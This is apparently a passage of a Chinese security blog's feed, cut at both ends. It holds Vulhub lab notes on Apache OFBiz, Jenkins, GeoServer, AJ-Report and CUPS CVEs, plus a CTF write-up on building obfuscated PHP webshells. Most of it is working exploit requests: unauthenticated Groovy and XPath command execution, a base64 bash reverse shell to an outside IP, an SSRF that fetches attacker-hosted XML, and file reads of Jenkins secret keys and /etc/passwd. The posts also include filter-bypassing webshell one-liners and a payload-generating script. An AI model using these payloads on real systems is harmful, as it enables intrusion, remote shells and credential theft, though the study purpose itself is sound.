272​groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b</code></pre><h3 id="CVE-2023-51467"><a href="#CVE-2023-51467" class="headerlink" title="CVE-2023-51467"></a>CVE-2023-51467</h3><p>这个漏洞的原因是对于CVE-2023-49070的不完全修复。在Apache OFBiz 18.12.10版本中，官方移除了可能导致RCE漏洞的XMLRPC组件，但没有修复权限绕过问题。来自长亭科技的安全研究员枇杷哥利用这一点找到了另一个可以导致RCE的方法：Groovy表达式注入。</p><pre><code>POST /webtools/control/ProgramExport/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1Host: localhost:8443User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-Type: application/x-www-form-urlencodedContent-Length: 55groovyProgram=throw+new+Exception(&#39;id&#39;.execute().text);</code></pre><pre><code>POST /webtools/control/ProgramExport/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1Host: localhost:8443User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-Type: application/x-www-form-urlencodedContent-Length: 71groovyProgram=&#39;bash+-c+&#123;echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjE3MS4xLzQ0MyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;.execute();</code></pre><h1 id="Apache-OFBiz-SSRF-和远程代码执行漏洞（CVE-2024-45507）"><a href="#Apache-OFBiz-SSRF-和远程代码执行漏洞（CVE-2024-45507）" class="headerlink" title="Apache OFBiz SSRF 和远程代码执行漏洞（CVE-2024-45507）"></a>Apache OFBiz SSRF 和远程代码执行漏洞（CVE-2024-45507）</h1><p>Apache OFBiz 18.12.16之前的版本存在一处SSRF与远程命令执行漏洞，未经身份验证的攻击者可以利用该漏洞执行任意命令并控制服务器。</p><h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p>向<code>/webtools/control/forgotPassword/StatsSinceStart</code>发送以下POST请求即可：</p><pre><code>POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1Host: your-ip:8443Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 64statsDecoratorLocation=http://192.168.91.148:8000</code></pre><p>ssrf验证成功</p><p>在公共服务器上创建一个恶意的XML文件（payload.xml），例如</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;screens xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;        xmlns=&quot;http://ofbiz.apache.org/Widget-Screen&quot; xsi:schemaLocation=&quot;http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd&quot;&gt;    &lt;screen name=&quot;StatsDecorator&quot;&gt;        &lt;section&gt;            &lt;actions&gt;                &lt;set value=&quot;$&#123;groovy:&#39;touch /tmp/success&#39;.execute();&#125;&quot;/&gt;            &lt;/actions&gt;        &lt;/section&gt;    &lt;/screen&gt;&lt;/screens&gt;</code></pre><p>然后将恶意XML的URL替换进请求中发送：</p><pre><code>POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1Host: your-ip:8443Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 64statsDecoratorLocation=http://192.168.91.148:8000/payload.xml</code></pre><p>rce success</p><h1 id="Jenkins-CLI-接口任意文件读取漏洞（CVE-2024-23897）"><a href="#Jenkins-CLI-接口任意文件读取漏洞（CVE-2024-23897）" class="headerlink" title="Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）"></a>Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）</h1><p>enkins是一个开源的自动化服务器。</p><p>Jenkins使用<a href="https://github.com/kohsuke/args4j">args4j</a>来解析命令行输入，并支持通过HTTP、Websocket等协议远程传入命令行参数。args4j中用户可以通过<code>@</code>字符来加载任意文件，这导致攻击者可以通过该特性来读取服务器上的任意文件。</p><p>该漏洞影响Jenkins 2.441及以前的版本。</p><p>利用该漏洞可以直接使用官方提供的命令行客户端，在<code>http://localhost:8080/jnlpJars/jenkins-cli.jar</code>下载。</p><p>使用该工具读取目标服务器的<code>/proc/self/environ</code>文件，可以找到Jenkins的基础目录，<code>JENKINS_HOME=/var/jenkins_home</code>：</p><pre><code>java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 &quot;@/proc/self/environ&quot;</code></pre><p><img src="/img/11.png" alt="img"></p><p>（匿名情况下，只能通过命令行的报错读取文件的第一行）</p><p>然后，可在该目录下读取敏感文件，如<code>secrets.key</code> or <code>master.key</code></p><pre><code>java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 &quot;@/var/jenkins_home/secret.key&quot;</code></pre><p>因为开启了“匿名用户可读”选项，你也可以直接使用<code>connect-node</code>命令读取完整文件内容：</p><pre><code>java -jar jenkins-cli.jar -s http://localhost:8080/ -http connect-node &quot;@/etc/passwd&quot;</code></pre><h1 id="GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）"><a href="#GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）" class="headerlink" title="GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）"></a>GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）</h1><p>GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。</p><p>在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。</p><p>在官方<a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">漏洞通告</a>中提到可以找到漏洞相关的WFS方法：</p><blockquote><p>已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求利用此漏洞。已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求利用此漏洞。</p></blockquote><p>这里使用<code>GetPropertyValue</code>来执行xpath表达式。</p><p>基于GET方法的POC：</p><pre><code>GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),&#39;touch%20/tmp/success1&#39;) HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36Connection: closeCache-Control: max-age=0</code></pre><p><img src="/img/image-20241120001445232.png" alt="image-20241120001445232"></p><p>基于POST方法的POC：</p><pre><code>POST /geoserver/wfs HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/xmlContent-Length: 356&lt;wfs:GetPropertyValue service=&#39;WFS&#39; version=&#39;2.0.0&#39; xmlns:topp=&#39;http://www.openplans.org/topp&#39; xmlns:fes=&#39;http://www.opengis.net/fes/2.0&#39; xmlns:wfs=&#39;http://www.opengis.net/wfs/2.0&#39;&gt;  &lt;wfs:Query typeNames=&#39;sf:archsites&#39;/&gt;  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),&#39;touch /tmp/success2&#39;)&lt;/wfs:valueReference&gt;&lt;/wfs:GetPropertyValue&gt;</code></pre><p><img src="/img/image-20241120001729204.png" alt="image-20241120001729204"></p><p>修改包要调整<code>Content-Type: application/xml</code></p><h1 id="AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）"><a href="#AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）" class="headerlink" title="AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）"></a>AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）</h1><p>AJ-Report是全开源的一个BI平台。在其1.4.0版本及以前，存在一处认证绕过漏洞，攻击者利用该漏洞可以绕过权限校验并执行任意代码。</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20241120221853461.png" alt="image-20241120221853461"></p><p>poc </p><pre><code>POST /dataSetParam/verification;swagger-ui/ HTTP/1.1Host: 127.0.0.1:9095User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: adminer_permanent=; OFBiz.Visitor=10000Content-Type: application/json;charset=UTF-8Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Content-Type: application/x-www-form-urlencodedContent-Length: 341&#123;&quot;ParamName&quot;:&quot;&quot;,&quot;paramDesc&quot;:&quot;&quot;,&quot;paramType&quot;:&quot;&quot;,&quot;sampleItem&quot;:&quot;1&quot;,&quot;mandatory&quot;:true,&quot;requiredFlag&quot;:1,&quot;validationRules&quot;:&quot;function verification(data)&#123;a = new java.lang.ProcessBuilder(\&quot;id\&quot;).start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss=&#39;&#39;;while((line = r.readLine()) != null)&#123;ss+=line&#125;;return ss;&#125;&quot;&#125;</code></pre><p>依然是要记得改<code>Content-Type: application/json;charset=UTF-8</code></p><p>rce成功</p><h1 id="OpenPrinting-Cups-Browsed-PDD-FoomaticRIPCommandLine-参数导致远程命令执行漏洞（CVE-2024-47177）"><a href="#OpenPrinting-Cups-Browsed-PDD-FoomaticRIPCommandLine-参数导致远程命令执行漏洞（CVE-2024-47177）" class="headerlink" title="OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）"></a>OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）</h1><p><strong>这个洞在HTB_EvilCUPS遇到过。</strong></p><p>OpenPrinting CUPS（通用Unix打印系统）是为类Unix操作系统开发的开源打印系统。它允许计算机充当打印服务器，高效管理本地和网络打印机。Cups-Browsed是CUPS系统的一部分，是一个专门用于浏览网络上其他CUPS服务器共享的远程打印机的守护进程。它可以自动发现和配置网络打印机，让用户更容易访问和使用网络上共享的打印资源，无需手动设置。</p><p>在Cups-Browsed 2.0.1及之前的版本中，存在一个由PPD（PostScript打印机描述）文件中的<code>FoomaticRIPCommandLine</code>参数处理不当引起的问题。攻击者可以通过创建一个恶意的IPP（互联网打印协议）服务器来利用这个漏洞，向易受攻击的Cups-Browsed实例发送精心制作的打印机信息，然后在运行易受攻击的Cups-Browsed的系统上执行任意命令。</p><p><a href="https://github.com/vulhub/evil-ipp-server">vulhub&#x2F;evil-ipp-server: A evil IPP server to reproduce CVE-2024-47177</a></p><p><a href="https://github.com/ippsec/evil-cups">IppSec&#x2F;evil-cups</a></p><blockquote><p>python poc.py [evil-ip] [target-ip]</p></blockquote><p>这个脚本会在<code>[evil-ipp-server-ip]</code>上启动一个恶意的IPP服务器，并向目标机器<code>[target-ip]</code>上的Cups-Browsed服务发送一个UDP数据包。</p><p>一旦Cups-Browsed接收到请求，它将尝试连接到恶意的IPP服务器并。IPP服务器会返回精心构造的<code>printer-privacy-policy-uri</code>属性，该属性中包含恶意payload，其结构如下：</p><pre><code>(    SectionEnum.printer,    b&#39;printer-privacy-policy-uri&#39;,    TagEnum.uri): [b&#39;https://www.google.com/&quot;\n*FoomaticRIPCommandLine: &quot;&#39; +    b&#39;echo 1 &gt; /tmp/I_AM_VULNERABLE&#39; +    b&#39;&quot;\n*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip&#39;],</code></pre><p>然后，Cups-Browsed会在<code>/tmp/</code>目录下创建一个临时PPD文件，我们的payload会被注入到这个文件中。下图是相关的Cups-Browsed日志：</p><p><img src="/img/121.png" alt="img"></p><p>此时，命令还未执行，因为我们需要至少一个打印任务来触发命令的执行。</p><p>打印任务可能来自于正常用户，也可以来自攻击者。如果TCP 631端口开放，我们可以使用浏览器访问，并找到刚才增加的恶意IPP打印机，并创建一个“打印测试页面”的打印任务。</p><p>这里环境打不开，先到这里吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;紧急备考&lt;/p&gt;
&lt;h1 id=&quot;PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）&quot;&gt;&lt;a href=&quot;#PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    
    <category term="紧急备考2024" scheme="https://taninluv.github.io/tags/%E7%B4%A7%E6%80%A5%E5%A4%87%E8%80%832024/"/>
    
  </entry>
  
  <entry>
    <title>自增RCE</title>
    <link href="https://taninluv.github.io/2024/11/17/%E8%87%AA%E5%A2%9ERCE/"/>
    <id>https://taninluv.github.io/2024/11/17/%E8%87%AA%E5%A2%9ERCE/</id>
    <published>2024-11-17T02:13:34.000Z</published>
    <updated>2024-11-17T03:13:18.966Z</updated>
    
    <content type="html"><![CDATA[<p>[从CTFShow<a href="https://cloud.tencent.com/developer/article/2288274">RCE挑战]中学习自增构造webshell-腾讯云开发者社区-腾讯云</a></p><p>直接从博主搬一点过来作备用</p><h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>将字符<code>A</code>和<code>?</code>进行异或操作</p><p>首先将<code>A</code>和<code>?</code>分别转换为对应的ASCII码，A变为65，?变为63 然后将其转换为对应的二进制数，A变为<code>1000001</code>，1变为<code>111111</code> 接下来就进行运算，异或的运算规则是相同为0，不同为1</p><pre><code>A:10000011:0111111(少一位，前面补0即可) 结果：1111110</code></pre><p>接下来将其二进制转换为对应十进制数，<code>1111110</code>对应的十进制数为<code>126</code>，根据ASCII码表可知126对应的是<code>~</code>，所以这个时候得到的字符就是<code>~</code>。 因此，我们利用这种思路，可以借助异或构造payload如下</p><pre><code>$__=(&quot;#&quot;^&quot;|&quot;); // _$__.=(&quot;.&quot;^&quot;~&quot;); // _P$__.=(&quot;/&quot;^&quot;`&quot;); // _PO$__.=(&quot;|&quot;^&quot;/&quot;); // _POS$__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST $$__[_]($$__[__]); // $_POST[_]($_POST[__]);</code></pre><p>然后我们再取消一下换行符，将它合并于一行之中</p><p>最后进行一次URL编码（因为<a href="https://cloud.tencent.com/product/message-queue-catalog?from_column=20065&from=20065">中间件</a>会进行一次解码，所以我们这里需要手动编码一次），即可得最终payload</p><pre><code>%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B</code></pre><p>但是这种方式如果自己去慢慢找的话，过程是极为缓慢的，想到我们异或一次不仅能构造出一个字符，也可以一次构造出多个字符，比如<code>(&#39;AB&#39;)^(&#39;11&#39;)</code></p><p>此时就可以得到<code>ps</code>字符串，那我们这里是不是就可以构造一个脚本，通过一次异或运算得到我们想构造的字符串，比如<code>system</code>，那这里的话我们大体思路的话就有了</p><pre><code>第一步：寻找未被过滤的字符第二步：写入我们想构造的字符串，然后对它进行一个遍历，先获取第一个字符第三步：用刚刚找到的未被过滤的字符进行一个遍历，看哪两个能够通过异或运算构造出第一个字符，同理得到后面的第四步：输出时将字符进行一个URL编码，因为涉及到了部分不可见字符</code></pre><p>这里想到之前在CTFShow命令执行系列中用过一个脚本与此类似，这里简单修改一下脚本，就可以达到我们想要的效果了，脚本如下</p><pre><code>import reimport requestsimport urllibfrom sys import *import osa=[]ans1=&quot;&quot; ans2=&quot;&quot;for i in range(0,256): #设置i的范围    c=chr(i)    #将i转换成ascii对应的字符，并赋值给c    tmp = re.match(r&#39;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#39;,c,re.I)    #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符    if(tmp):        continue        #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可    else:        a.append(i)        #在数组中增加i，这些就是未被系统过滤掉的字符# eval(&quot;echo($c);&quot;);mya=&quot;system&quot;  #函数名 这里修改！myb=&quot;dir&quot;      #参数def myfun(k,my): #自定义函数    global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错    global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错    for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量         for j in range(i,len(a)): #在上个循环的条件下设置j的范围            if(a[i]^a[j]==ord(my[k])):                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])                return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符for x in range(0,len(mya)): #设置k的范围    myfun(x,mya)#引用自定义的函数data1=&quot;(&#39;&quot;+urllib.request.quote(ans1)+&quot;&#39;^&#39;&quot;+urllib.request.quote(ans2)+&quot;&#39;)&quot; #data1等于传入的命令,&quot;+ans1+&quot;是固定格式，这样可以得到变量对应的值，再用&#39;包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值print(data1)ans1=&quot;&quot;#对ans1进行重新赋值ans2=&quot;&quot;#对ans2进行重新赋值for k in range(0,len(myb)):#设置k的范围为(0,len(myb))    myfun(k,myb)#再次引用自定义函数data2=&quot;(\&quot;&quot;+urllib.request.quote(ans1)+&quot;\&quot;^\&quot;&quot;+urllib.request.quote(ans2)+&quot;\&quot;)&quot;print(data2)</code></pre><h1 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h1><p><a href="https://www.php.net/manual/zh/language.operators.increment.php%E5%BD%93%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87%E6%9F%90%E7%A7%8D%E6%96%B9%E6%B3%95%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E6%97%B6%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%87%AA%E5%A2%9E%E6%9D%A5%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%AF%94%E5%A6%82%E7%8E%B0%E5%9C%A8%E6%88%91%E4%BB%AC%E8%8E%B7%E5%8F%96%E5%88%B0%E4%BA%86=A%EF%BC%8C%E6%88%91%E4%BB%AC%E8%BF%9B%E8%A1%8C_++%EF%BC%8C%E6%AD%A4%E6%97%B6">https://www.php.net/manual/zh/language.operators.increment.php当我们通过某种方法可以得到一个字符时，我们就可以通过自增来获取其他字符，比如现在我们获取到了=A，我们进行_++，此时</a></p><p>使用数组拼接字符串获取<code>A</code></p><pre><code>&lt;?php$_=[].&#39;1&#39;;var_dump($_);</code></pre><p>这里看到输出的是<code>Array1</code></p><pre><code>&lt;?php$_=[].&#39;&#39;;var_dump($_);</code></pre><p>成功获取到了字符Array，然后我们获取想获取A的话，就可以采用[0]这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在[]里加一个&#x3D;&#x3D;，此时因为空和不同，它就会输出0，此时也就等同于_[0]，具体实现代码如下</p><pre><code>&lt;?php$_=[];$_=$_[&#39;&#39;==&#39;$&#39;];echo $_;</code></pre><p>博主这里显示的是<code>A</code>，但我的显示为NULL</p><pre><code>&lt;?php$_=[].&#39;&#39;;//Array$_=$_[&#39;&#39;==&#39;$&#39;];//A$_++;//B$_++;//C$_++;//D$_++;//E$__=$_;//E$_++;//F$_++;//G$___=$_;//G$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T$_=$___.$__.$_;//GET//var_dump($_);$_=&#39;_&#39;.$_;//_GETvar_dump($$_[_]($$_[__]));//$_GET[_]($_GET[__])</code></pre><p>我的vscode会报错，感觉是不能直接dump的</p><p>接下来就可以尝试去给<code>_</code>和<code>__</code>GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样</p><pre><code>$_=[].&#39;&#39;;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=&#39;_&#39;.$_;$$_[_]($$_[__]);</code></pre><pre><code>%24_%3D%5B%5D.&#39;&#39;%3B%24_%3D%24_%5B&#39;&#39;%3D%3D&#39;%24&#39;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D&#39;_&#39;.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B</code></pre><p><img src="/img/7e0a7ef74b938c93a0f76ed938a91f36.png" alt="img"></p><p>post数据上去的时候可以get传参</p><p><code>_</code>为函数名<code>__</code>为参数，如<code>ip?&amp;_=system&amp;__dir</code></p><p>放一个测试成功的脚本：</p><pre><code>&lt;?php$_=[];$_=&quot;$_&quot;.&#39;&#39;;$_=$_[0];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__.$___.$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;// var_dump($____);$_=$$____;@$___($_[$___[2].$___[2].$___[1]][$___[3].$___[1].$___[1]][$___[3].$___[4].$___[1]]);// print_r($___[1]);// print_r($___[2]);// print_r($___[3]);// print_r($___[4]);// var_dump($_);// // $___ = system// $___[2] =echo &quot;cmd= system($_POST[SSY][TSS][TEY])&quot;;</code></pre><h2 id="关于自增的一些知识点"><a href="#关于自增的一些知识点" class="headerlink" title="关于自增的一些知识点"></a>关于自增的一些知识点</h2><h3 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h3><p>在自增中，可以通过特殊字符构造出字符串的有以下几种方式</p><pre><code>[].&#39;&#39;  //Array(0/0).&#39;&#39;   //NAN(1/0).&#39;&#39;   //INF</code></pre><p>这个时候就有一个问题了，如果ban了数字，我们该怎么去构造<code>NAN</code>和<code>INF</code>呢，这个时候就需要讲到一个知识点，我们这里的话需要说一下这个<code>NAN</code>和<code>INF</code></p><p>这里可以看出<code>NAN</code>表示的是未被定义的值，所以我们这里可以通过<code>a/a</code>这种方式构造，如果字母也被ban，我们也可以借助其他字符，比如<code>_/_</code>，这个时候也可以得到<code>NAN</code>，同理，<code>INF</code>也可以通过<code>1/a</code>的方式获取。</p><pre><code>NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</code></pre><h3 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h3><blockquote><p>​         这里需要说明一下，笔者小白，对这个不太了解，然后可能这并不算什么知识点，还请各位大师傅多多担待</p></blockquote><p>我们在构造POST中的时，正常操作的话是这样，a&#x3D;’_’.b(假设这里b就是POST)，然后这个时候如果’被ban，看似这里是无法再利用了，但其实，我们直接写a&#x3D;.b也是可以的，这个时候效果同上而且缩短了字符长度。</p><h1 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h1><p>这个的话我们这里其实是利用了不可见字符，我们对一个字符进行两次取反，得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。</p><p>这里的话利用一个php脚本即可获取我们想要的字符</p><pre><code>&lt;?php$ans1=&#39;system&#39;;//函数名$ans2=&#39;dir&#39;;//命令$data1=(&#39;~&#39;.urlencode(~$ans1));//通过两次取反运算得到system$data2=(&#39;~&#39;.urlencode(~$ans2));//通过两次取反运算得到direcho (&#39;(&#39;.$data1.&#39;)&#39;.&#39;(&#39;.$data2.&#39;)&#39;.&#39;;&#39;);</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[从CTFShow&lt;a href=&quot;https://cloud.tencent.com/developer/article/2288274&quot;&gt;RCE挑战]中学习自增构造webshell-腾讯云开发者社区-腾讯云&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;直接从博主搬一点过来作备用&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulhub_Others</title>
    <link href="https://taninluv.github.io/2024/11/14/Vulhub-Others/"/>
    <id>https://taninluv.github.io/2024/11/14/Vulhub-Others/</id>
    <published>2024-11-14T09:27:59.000Z</published>
    <updated>2024-11-18T15:14:37.785Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Adminer"><a href="#Adminer" class="headerlink" title="Adminer"></a>Adminer</h1><h2 id="CVE-2021-21311"><a href="#CVE-2021-21311" class="headerlink" title="CVE-2021-21311"></a>CVE-2021-21311</h2><p>Adminer是一个PHP编写的开源数据库管理工具，支持MySQL、MariaDB、PostgreSQL、SQLite、MS SQL、Oracle、Elasticsearch、MongoDB等数据库。</p><p>在其4.0.0到4.7.9版本之间，连接 ElasticSearch 和 ClickHouse 数据库时存在一处服务端请求伪造漏洞（SSRF）。</p><p>在Adminer登录页面，选择ElasticSearch作为系统目标，并在server字段填写<code>example.com</code>，点击登录即可看到<code>example.com</code>返回的400错误页面展示在页面中</p><p><img src="/img/image-20241117114119383.png" alt="image-20241117114119383"></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20241117114138678.png" alt="image-20241117114138678"></p><p><a href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞（原理、挖掘点、漏洞利用、修复建议） - Saint_Michael - 博客园</a></p><blockquote><h2 id="7-1-常用绕过方法"><a href="#7-1-常用绕过方法" class="headerlink" title="7.1.常用绕过方法"></a>7.1.常用绕过方法</h2><p>　　1.@　　　　　　　　　　<a 